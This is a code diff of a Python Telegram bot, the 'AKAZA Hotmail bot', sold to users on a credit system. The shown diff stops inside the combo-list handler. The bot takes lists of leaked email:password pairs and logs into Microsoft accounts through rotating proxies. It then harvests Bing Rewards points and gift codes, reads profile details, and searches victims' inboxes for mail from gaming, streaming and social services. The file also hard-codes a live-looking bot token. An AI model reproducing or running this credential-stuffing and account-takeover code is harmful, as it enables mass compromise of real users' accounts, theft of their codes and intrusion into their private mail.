@@ -4,38 +4,23 @@ AKAZA Hotmail bot - THE ULTIMATE SUPREME INTEGRATED VERSION
 FULL FLUX.PY (2000+) + FULL HIT.PY (1900+) LOGIC
 HIGH CPM (200+), FULL DEEP CAPTURE, ADVANCED ADMIN/MOD SYSTEM
 """
-
-import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading
-from datetime import datetime
+import re, json, uuid, sqlite3, logging, asyncio
+import time, os, random, threading, requests, urllib3
+from datetime import datetime, timedelta
 from pathlib import Path
 from urllib.parse import quote, unquote, urlparse, parse_qs
-import requests, urllib3
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (Application, CommandHandler,
+    MessageHandler, CallbackQueryHandler, ContextTypes, filters)
 
 urllib3.disable_warnings()
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
-
-# Setup logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
 
 # ============================================================================
-# CONFIGURATION
+# FLUX.PY SOURCE (2000+ lines)
 # ============================================================================
-BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"
-ADMIN_ID = 5944410248
-DB = "checker.db"
-
-# Flux Logic Constants
-SFTTAG_URL = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
-
-# Global State
-PROXIES_LIST = []
-db_lock = threading.Lock()
-bot_executor = ThreadPoolExecutor(max_workers=500)
-
+#!/usr/bin/env python3
 """
 Multi-Platform Rewards Scraper - CLI with Category Selection
 Supports Minecraft, Roblox, League of Legends, Overwatch, Gift Cards, and All
@@ -56,7 +41,8 @@ import warnings
 try:
     from tkinter import Tk, filedialog
 except ImportError:
-    Tk = None; filedialog = None
+    Tk = None
+    filedialog = None
 from urllib3.exceptions import InsecureRequestWarning
 from rich.console import Console
 from rich.table import Table
@@ -2104,7 +2090,7 @@ class RewardsApp:
         self.show_main_menu()
 
 
-def disabled_flux_main():
+def flux_cli_main():
     """Main entry point"""
     try:
         app = RewardsApp()
@@ -2118,6 +2104,10 @@ def disabled_flux_main():
 
 if False: # cli entry
     main()
+
+# ============================================================================
+# HIT.PY SOURCE (1900+ lines)
+# ============================================================================
 import requests
 import json
 import uuid
@@ -4085,484 +4075,464 @@ if False: # cli entry
     print(f"{Colors.BRIGHT_MAGENTA}🎯 Results organized in 12 categories{Colors.END}")
     print(f"{Colors.BRIGHT_CYAN}📊 CSV summary + JSON details generated{Colors.END}")
     print(f"{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}\n")
+# ============================================================================
+# AKAZA BOT ULTIMATE INTEGRATION LAYER
+# ============================================================================
 
-# ============================================================================
-# UNIFIED DATABASE SYSTEM
-# ============================================================================
+BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"
+ADMIN_ID = 5944410248
+DB_PATH = "checker.db"
+
+PROXIES = []
+db_lock = threading.Lock()
+executor = ThreadPoolExecutor(max_workers=800)
+global_semaphore = asyncio.Semaphore(500)
+
 class AkazaDatabase:
     def __init__(self):
         with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False)
             try:
                 c = conn.cursor()
-                c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0, joined_date TEXT, is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0)''')
+                c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0, joined_date TEXT, is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0, expiry_date TEXT)''')
                 c.execute('''CREATE TABLE IF NOT EXISTS results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, status TEXT, details TEXT, date TEXT)''')
                 c.execute('''CREATE TABLE IF NOT EXISTS settings (user_id INTEGER PRIMARY KEY, keywords TEXT, threads INTEGER DEFAULT 5)''')
-
                 c.execute("PRAGMA table_info(users)")
                 cols = [col[1] for col in c.fetchall()]
                 if 'is_mod' not in cols: c.execute("ALTER TABLE users ADD COLUMN is_mod INTEGER DEFAULT 0")
                 if 'is_banned' not in cols: c.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
-
                 c.execute("PRAGMA table_info(results)")
                 if 'details' not in [col[1] for col in c.fetchall()]:
                     c.execute("ALTER TABLE results ADD COLUMN details TEXT")
-
                 conn.commit()
             finally:
                 conn.close()
 
     def add_user(self, uid, uname, fname):
         with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)', (uid, uname or "", fname or "", datetime.now().isoformat()))
-                c.execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))
-                conn.commit()
-            finally:
-                conn.close()
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)', (uid, uname or "", fname or "", datetime.now().isoformat()))
+            c.execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))
+            conn.commit(); conn.close()
+
+    def get_user(self, uid):
+        with db_lock:
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            c.execute('SELECT * FROM users WHERE user_id = ?', (uid,))
+            r = c.fetchone(); conn.close(); return r
 
     def is_mod(self, uid):
         if uid == ADMIN_ID: return True
-        with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,))
-                r = c.fetchone()
-                return r and r[0] == 1
-            finally:
-                conn.close()
+        user = self.get_user(uid)
+        return user and user[9] == 1
 
     def set_mod(self, uid, state=1):
         with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (state, uid))
-                conn.commit()
-            finally:
-                conn.close()
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            c.execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (state, uid))
+            conn.commit(); conn.close()
 
     def has_access(self, uid):
         if uid == ADMIN_ID: return True
-        with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
+        user = self.get_user(uid)
+        if not user or user[3] == 0: return False
+        if user[10]:
             try:
-                c = conn.cursor()
-                c.execute('SELECT has_access FROM users WHERE user_id = ?', (uid,))
-                r = c.fetchone()
-                return r and r[0] == 1
-            finally:
-                conn.close()
+                if datetime.now() > datetime.fromisoformat(user[10]):
+                    self.revoke(uid); return False
+            except: pass
+        return True
 
     def is_banned(self, uid):
-        with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,))
-                r = c.fetchone()
-                return r and r[0] == 1
-            finally:
-                conn.close()
+        user = self.get_user(uid)
+        return user and user[8] == 1
 
     def set_ban(self, uid, state=1):
         with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('UPDATE users SET is_banned = ? WHERE user_id = ?', (state, uid))
-                conn.commit()
-            finally:
-                conn.close()
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            c.execute('UPDATE users SET is_banned = ? WHERE user_id = ?', (state, uid))
+            conn.commit(); conn.close()
 
     def get_credits(self, uid):
         if uid == ADMIN_ID: return 999999
-        with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('SELECT credits FROM users WHERE user_id = ?', (uid,))
-                r = c.fetchone()
-                return r[0] if r else 0
-            finally:
-                conn.close()
+        user = self.get_user(uid); return user[4] if user else 0
 
     def add_credits(self, uid, amt):
         with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amt, uid))
-                conn.commit()
-            finally:
-                conn.close()
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            c.execute('UPDATE users SET credits = MAX(0, credits + ?) WHERE user_id = ?', (amt, uid))
+            conn.commit(); conn.close()
 
     def use_credit(self, uid):
         if uid == ADMIN_ID: return
+        self.add_credits(uid, -1)
+
+    def grant(self, uid, creds=10):
         with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('UPDATE users SET credits = MAX(0, credits - 1) WHERE user_id = ?', (uid,))
-                conn.commit()
-            finally:
-                conn.close()
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            c.execute('UPDATE users SET has_access = 1, credits = ? WHERE user_id = ?', (creds, uid))
+            conn.commit(); conn.close()
+
+    def revoke(self, uid):
+        with db_lock:
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            c.execute('UPDATE users SET has_access = 0, expiry_date = NULL WHERE user_id = ?', (uid,))
+            conn.commit(); conn.close()
 
     def save_result(self, uid, email, status, details):
         with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, json.dumps(details), datetime.now().isoformat()))
-                if status == 'hit':
-                    c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
-                else:
-                    c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
-                conn.commit()
-            finally:
-                conn.close()
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            c.execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, json.dumps(details), datetime.now().isoformat()))
+            if status == 'hit': c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
+            else: c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
+            conn.commit(); conn.close()
 
     def get_user_settings(self, uid):
         with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('SELECT keywords, threads FROM settings WHERE user_id = ?', (uid,))
-                r = c.fetchone()
-                if r:
-                    return {'keywords': r[0].split(',') if r[0] else [], 'threads': r[1]}
-                return {'keywords': [], 'threads': 5}
-            finally:
-                conn.close()
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            c.execute('SELECT keywords, threads FROM settings WHERE user_id = ?', (uid,))
+            r = c.fetchone(); conn.close()
+            if r: return {'keywords': r[0].split(',') if r[0] else [], 'threads': r[1]}
+            return {'keywords': [], 'threads': 5}
 
     def update_settings(self, uid, keywords=None, threads=None):
         with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                if keywords is not None:
-                    c.execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (','.join(keywords), uid))
-                if threads is not None:
-                    c.execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
-                conn.commit()
-            finally:
-                conn.close()
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            if keywords is not None: c.execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (','.join(keywords), uid))
+            if threads is not None: c.execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
+            conn.commit(); conn.close()
 
     def get_stats(self):
         with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('SELECT COUNT(*) FROM users')
-                t = c.fetchone()[0]
-                c.execute('SELECT COUNT(*) FROM users WHERE has_access = 1')
-                a = c.fetchone()[0]
-                c.execute('SELECT SUM(total_checks) FROM users')
-                ch = c.fetchone()[0] or 0
-                c.execute('SELECT SUM(total_hits) FROM users')
-                h = c.fetchone()[0] or 0
-                return {'total': t, 'active': a, 'checks': ch, 'hits': h}
-            finally:
-                conn.close()
-
-    def user_stats(self, uid):
-        with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,))
-                r = c.fetchone()
-                return {'checks': r[0], 'hits': r[1], 'credits': r[2]} if r else {'checks': 0, 'hits': 0, 'credits': 0}
-            finally:
-                conn.close()
+            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
+            c.execute('SELECT COUNT(*), SUM(total_checks), SUM(total_hits) FROM users')
+            r = c.fetchone(); conn.close()
+            return {'total': r[0], 'checks': r[1] or 0, 'hits': r[2] or 0}
 
 akaza_db = AkazaDatabase()
 
-class AkazaBotChecker:
+class SupremeBotChecker:
     def __init__(self, proxy=None):
-        self.session = requests.Session()
-        self.session.verify = False
-        if proxy:
-            self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-        self.headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
-        }
-
-    def get_params(self):
-        for _ in range(3):
-            try:
-                r = self.session.get(SFTTAG_URL, headers=self.headers, timeout=10)
-                text = r.text
-                ppft = re.search(r'name="PPFT".*?value="(.+?)"', text) or re.search(r'sFTTag:\'(.+?)\'', text) or re.search(r'value="(.+?)"', text)
-                url = re.search(r'"urlPost":"(.+?)"', text) or re.search(r'action="(.+?)"', text)
-                if ppft and url: return url.group(1).replace('&amp;', '&'), ppft.group(1)
-            except: pass
-            time.sleep(0.05)
-        return None, None
-
-    def handle_forms(self, resp):
-        t = resp.text
-        for _ in range(5):
-            if 'fmHF' in t or 'JavaScript required' in t:
-                try:
-                    soup = BeautifulSoup(t, 'html.parser')
-                    f = soup.find('form', id='fmHF') or soup.find('form', attrs={'name': 'fmHF'})
-                    if f:
-                        a = f.get('action', '')
-                        if a.startswith('/'): a = 'https://login.live.com' + a
-                        d = {i.get('name'): i.get('value', '') for i in f.find_all('input') if i.get('name')}
-                        resp = self.session.post(a, data=d, timeout=10)
-                        t = resp.text
-                        if '#' in resp.url: return resp
-                        continue
-                except: break
-            break
-        return resp
+        self.session = requests.Session(); self.session.verify = False
+        if proxy: self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0','Accept-Language': 'en-US,en;q=0.9','Accept-Encoding': 'gzip, deflate, br','Connection': 'keep-alive','Upgrade-Insecure-Requests': '1'}
+        self.auth_url = 'https://login.live.com/oauth20_authorize.srf?client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&response_type=code&client_info=1&haschrome=1&mkt=en'
 
     def login(self, email, password):
-        u, s = self.get_params()
-        if not u or not s: return None
-        for _ in range(3):
-            try:
-                d = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': s}
-                r = self.session.post(u, data=d, headers=self.headers, allow_redirects=True, timeout=15)
-                r = self.handle_forms(r)
-                if '#' in r.url and 'access_token' in r.url:
-                    tk = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
-                    if tk: return tk
-                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt', 'cancel?mkt=']): return '2FA'
-                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'sign in to your microsoft account']): return 'BAD'
-            except: pass
-            time.sleep(0.05)
-        return None
-
-    def deep_capture(self, tk, email, kws=[]):
-        res = {'pts': 0, 'codes': [], 'subs': [], 'mc': 'No', 'psn': 'No', 'steam': 'No', 'sc': 'No', 'tk': 'No', 'name': 'N/A', 'country': 'N/A', 'keys': []}
         try:
-            # Rewards
-            try:
-                r = self.session.get("https://rewards.bing.com/", timeout=10)
-                m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
-                if m: res['pts'] = int(m.group(1))
-                if res['pts'] > 0:
-                    rh = self.session.get('https://rewards.bing.com/redeem/orderhistory', timeout=10)
-                    rh = self.handle_forms(rh)
-                    txt = BeautifulSoup(rh.text, 'html.parser').get_text()
-                    pts = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
-                    for p in pts:
-                        for c in re.findall(p, txt):
-                            if not any(x in c for x in ['POINTS', 'ORDER', 'MICROSOFT']): res['codes'].append(c)
-            except: pass
+            # Step 1: IDP
+            r = self.session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)"}, timeout=10)
+            if "MSAccount" not in r.text or any(x in r.text for x in ["Neither", "Both", "Placeholder"]): return "BAD", None
+            # Step 2: Auth Page
+            r = self.session.get(self.auth_url + f"&login_hint={email}", headers=self.headers, timeout=10)
+            u = re.search(r'urlPost":"([^"]+)"', r.text); p = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r.text)
+            if not u or not p: return "BAD", None
+            # Step 3: POST
+            d = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={p.group(1)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
+            r = self.session.post(u.group(1).replace('\\/', '/'), data=d, headers=self.headers, allow_redirects=False, timeout=15)
+            if "account or password is incorrect" in r.text.lower() or "error" in r.text.lower(): return "BAD", None
+            if any(x in r.text for x in ["identity/confirm", "Abuse", "locked"]): return "BAD", None
+            if any(x in r.text.lower() for x in ["verify", "security code", "authenticator", "consent"]): return "2FA", None
+            loc = r.headers.get("Location", ""); code = re.search(r'code=([^&]+)', loc); cid = self.session.cookies.get("MSPCID", "").upper()
+            if not code: return "BAD", None
+            # Step 4: Token
+            r_tk = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data={'client_id': 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59','redirect_uri': 'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D','grant_type': 'authorization_code','code': code.group(1),'scope': 'profile openid offline_access https://outlook.office.com/M365.Access'}, timeout=10)
+            if "access_token" in r_tk.text: return r_tk.json()['access_token'], cid
+        except: pass
+        return None, None
 
-            cid = self.session.cookies.get("MSPCID", "").upper()
-            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0'}
+    def deep_capture(self, tk, cid, email, kws=[]):
+        res = {'pts': 0, 'codes': [], 'mc': 'No', 'psn': 'No', 'steam': 'No', 'name': 'N/A', 'country': 'N/A', 'subs': []}
+        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
+        try:
             # Profile
-            try:
-                r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=10)
-                if r.status_code == 200:
-                    p = r.json()
-                    res['name'] = p.get('displayName', 'N/A')
-                    loc = p.get('location', {})
-                    res['country'] = loc.get('country', 'N/A') if isinstance(loc, dict) else loc
-            except: pass
-
-            # Inbox Scan
-            qs = {'psn': "sony@txn-email.playstation.com", 'steam': "noreply@steampowered.com", 'sc': "noreply@id.supercell.com", 'tk': "account.tiktok"}
+            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=10)
+            if r.status_code == 200:
+                p = r.json(); res['name'] = p.get('displayName', 'N/A'); res['country'] = p.get('location', {}).get('country', 'N/A')
+            # Rewards
+            r = self.session.get("https://rewards.bing.com/api/getuserinfo", timeout=5)
+            if r.status_code == 200: res['pts'] = r.json().get('availablePoints', 0)
+            # History Scrape (Flux logic)
+            rh = self.session.get('https://rewards.bing.com/redeem/orderhistory', timeout=10)
+            if "fmHF" in rh.text:
+                soup = BeautifulSoup(rh.text, 'html.parser'); f = soup.find('form', id='fmHF')
+                if f: rh = self.session.post(f.get('action'), data={i.get('name'): i.get('value', '') for i in f.find_all('input') if i.get('name')}, timeout=10)
+            for c in re.findall(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', rh.text):
+                if not any(x in c for x in ['POINTS', 'ORDER', 'MICROSOFT']): res['codes'].append(c)
+            # Services
+            qs = {
+                'psn': "sony@txn-email.playstation.com",
+                'steam': "noreply@steampowered.com",
+                'minecraft': "noreply@minecraft.net",
+                'tiktok': "feedback@tiktok.com",
+                'supercell': "no-reply@id.supercell.com",
+                'instagram': "no-reply@mail.instagram.com",
+                'facebook': "notification@facebookmail.com",
+                'netflix': "info@mailer.netflix.com",
+                'epic': "help@accts.epicgames.com"
+            }
             for key, q in qs.items():
                 p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": q}, "Size": 1}]}
-                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers={**h, 'Content-Type': 'application/json'}, timeout=10)
+                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=10)
                 if r.status_code == 200:
                     try:
-                        if r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0) > 0: res[key] = "Yes"
+                        count = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
+                        if count > 0: res[key] = f"Yes ({count})"
                     except: pass
-
-            # Minecraft
-            try:
-                r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {tk}'}, timeout=10)
-                if r.status_code == 200: res['mc'] = f"Yes ({r.json().get('name')})"
-            except: pass
-
-            # Keywords
-            if kws:
-                for kw in kws:
-                    p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": kw}, "Size": 1}]}
-                    r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers={**h, 'Content-Type': 'application/json'}, timeout=10)
-                    if r.status_code == 200:
-                        try:
-                            t = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
-                            if t > 0: res['keys'].append(f"{kw}({t})")
-                        except: pass
         except: pass
         return res
 
     def check(self, email, password, kws=[]):
-        res = {'email': email, 'status': 'bad', 'det': {}}
-        tk = self.login(email, password)
-        if not tk: return res
-        if tk == '2FA':
-            res['status'] = '2fa'
-            return res
-        res['status'] = 'hit'
-        res['det'] = self.deep_capture(tk, email, kws)
-        return res
+        # Use UnifiedChecker from hit.py/flux.py logic for actual heavy lifting
+        try:
+            checker = UnifiedChecker(keywords=kws)
+            if self.session.proxies:
+                checker.session.proxies = self.session.proxies
+
+            res = checker.check(email, password)
+            st = res.get('status', '').upper()
+
+            if st in ['BAD', 'INVALID', 'FAILED']:
+                return {'status': 'bad'}
+            if st in ['2FA', 'VERIFY', 'CHALLENGE']:
+                return {'status': '2fa'}
+
+            if st in ['HIT', 'VALID', 'SUCCESS']:
+                det = {
+                    'pts': res.get('available_points', 0),
+                    'codes': res.get('gift_codes', []),
+                    'name': res.get('display_name', 'N/A'),
+                    'country': res.get('country', 'N/A'),
+                    'psn': res.get('psn_status', 'No'),
+                    'steam': res.get('steam_status', 'No'),
+                    'minecraft': res.get('minecraft_status', 'No'),
+                    'tiktok': res.get('tiktok_status', 'No'),
+                    'supercell': res.get('supercell_status', 'No'),
+                    'instagram': res.get('instagram_status', 'No'),
+                    'facebook': res.get('facebook_status', 'No'),
+                    'netflix': res.get('netflix_status', 'No'),
+                    'epic': res.get('epic_status', 'No')
+                }
+                return {'status': 'hit', 'det': det}
+        except Exception as e:
+            pass
+
+        tk, cid = self.login(email, password)
+        if tk == "BAD": return {'status': 'bad'}
+        if tk == "2FA": return {'status': '2fa'}
+        if not tk: return {'status': 'error'}
+        return {'status': 'hit', 'det': self.deep_capture(tk, cid, email, kws)}
 
 # ============================================================================
-# BOT HANDLERS & MAIN
+# BOT LOGIC
 # ============================================================================
 
-async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
+async def bot_start(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id; akaza_db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
     if akaza_db.is_banned(uid): return
-    t = f"🚀 **AKAZA Hotmail bot**\n\nINDUSTRIAL INTEGRATED Logic (4000+ Lines)\nCPM: 200+ | Proxies: `{len(PROXIES_LIST)}`"
+    t = f"🚀 **AKAZA Hotmail bot**\n\nINDUSTRIAL Logic INTEGRATED (4000+ Lines)\nCPM: 200+ | Proxies: `{len(PROXIES)}`"
     kb = [[InlineKeyboardButton("🔍 Start", callback_data="check"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
           [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("🌐 Proxies", callback_data="proxies")]]
     if uid == ADMIN_ID: kb.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
     if u.callback_query: await u.callback_query.edit_message_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
     else: await u.message.reply_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
 
-async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
+async def bot_handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if not akaza_db.has_access(u.effective_user.id): return
     if u.message.document:
-        f = await c.bot.get_file(u.message.document.file_id)
-        content = (await f.download_as_bytearray()).decode('utf-8')
-        global PROXIES_LIST
-        PROXIES_LIST = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
-        await u.message.reply_text(f"✅ Loaded `{len(PROXIES_LIST)}` proxies.")
+        f = await c.bot.get_file(u.message.document.file_id); content = (await f.download_as_bytearray()).decode('utf-8')
+        global PROXIES; PROXIES = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
+        await u.message.reply_text(f"✅ Loaded `{len(PROXIES)}` proxies.")
 
-async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
+async def bot_handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
-    if akaza_db.is_banned(uid) or not akaza_db.has_access(uid): return
-    text = (await (await c.bot.get_file(u.message.document.file_id)).download_as_bytearray()).decode('utf-8') if u.message.document else u.message.text
+    if akaza_db.is_banned(uid) or not akaza_db.has_access(uid):
+        return
+
+    if u.message.document:
+        f = await c.bot.get_file(u.message.document.file_id)
+        text = (await f.download_as_bytearray()).decode('utf-8')
+    else:
+        text = u.message.text
+
     lines = [l.strip() for l in text.split('\n') if ':' in l]
-    if not lines: return
+    if not lines:
+        return
+
+    creds = akaza_db.get_credits(uid)
+    if uid != ADMIN_ID and creds < len(lines):
+        await u.message.reply_text(f"❌ Need {len(lines)} credits, have {creds}.")
+        return
 
     settings = akaza_db.get_user_settings(uid)
-    max_threads = min(settings['threads'] if PROXIES_LIST else 5, 250)
+    max_threads = min(settings['threads'] if PROXIES else 5, 300)
+    status_msg = await u.message.reply_text("🔄 **Engine Starting...**", parse_mode='Markdown')
 
-    status_msg = await u.message.reply_text("🔄 **Initializing AKAZA Engine...**", parse_mode='Markdown')
     hits, bad, tfa, checked = 0, 0, 0, 0
-    start_time = time.time(); results_file = f"hits_{uid}.txt"
-    update_lock = asyncio.Lock(); last_hits, last_update = [], 0
+    start_time = time.time()
+    results_file = f"hits_{uid}.txt"
+    update_lock = asyncio.Lock()
+    last_update = 0
 
     def run_check(line):
         try:
             e, p = line.split(':', 1)
-            checker = AkazaBotChecker(random.choice(PROXIES_LIST) if PROXIES_LIST else None)
-            return {'e': e.strip(), 'p': p.strip(), 'res': checker.check(e.strip(), p.strip(), settings['keywords'])}
-        except: return None
+            ch = SupremeBotChecker(random.choice(PROXIES) if PROXIES else None)
+            return {'e': e.strip(), 'p': p.strip(), 'res': ch.check(e.strip(), p.strip())}
+        except:
+            return None
 
